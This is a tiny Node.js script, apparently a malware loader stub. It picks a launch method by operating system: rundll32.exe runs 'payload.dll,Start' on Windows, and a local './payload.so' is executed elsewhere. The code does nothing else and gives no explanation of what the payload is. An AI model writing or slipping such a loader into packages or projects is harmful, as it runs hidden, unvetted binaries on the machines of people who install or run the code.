const childProcess = require("child_process");
const os = require("os");

if (os.platform() === "win32") {
  childProcess.execFile("rundll32.exe", ["payload.dll,Start"]);
} else {
  childProcess.execFile("./payload.so", []);
}
